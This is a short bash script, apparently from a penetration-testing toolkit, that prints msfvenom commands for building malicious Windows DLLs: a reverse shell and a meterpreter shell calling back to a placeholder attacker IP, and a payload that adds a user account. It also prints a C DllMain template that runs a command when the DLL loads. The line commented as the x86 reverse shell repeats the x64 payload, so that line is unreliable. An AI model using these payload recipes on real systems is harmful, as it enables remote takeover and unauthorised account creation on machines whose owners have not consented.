#!/bin/bash
# Generate a basic DLL payload for testing
# Usage: ./generate_dll_payload.sh [output_name] [payload_type]
# payload_type: reverse_shell, meterpreter, adduser, basic

OUTPUT_NAME="${1:-payload.dll}"
PAYLOAD_TYPE="${2:-basic}"

echo "Generating DLL payload: $OUTPUT_NAME"
echo "Type: $PAYLOAD_TYPE"
echo ""

case $PAYLOAD_TYPE in
    reverse_shell)
        echo "# Metasploit reverse shell (x64)"
        echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f dll -o $OUTPUT_NAME"
        echo ""
        echo "# Metasploit reverse shell (x86)"
        echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f dll -o $OUTPUT_NAME"
        ;;
    meterpreter)
        echo "# Metasploit meterpreter (x86)"
        echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f dll -o $OUTPUT_NAME"
        ;;
    adduser)
        echo "# Metasploit add user (x86)"
        echo "msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f dll -o $OUTPUT_NAME"
        ;;
    basic)
        echo "# Custom C DLL template"
        cat << 'EOF'
#include <windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Payload executes here
        system("whoami > C:\\users\\public\\output.txt");
        // WinExec("calc.exe", SW_HIDE); // Alternative
    }
    return TRUE;
}
EOF
        echo ""
        echo "# Compile with MinGW"
        echo "# x64: x86_64-w64-mingw32-gcc -shared -o $OUTPUT_NAME source.c"
        echo "# x86: i686-w64-mingw32-gcc -shared -o $OUTPUT_NAME source.c"
        ;;
    *)
        echo "Unknown payload type. Use: reverse_shell, meterpreter, adduser, or basic"
        exit 1
        ;;
esac
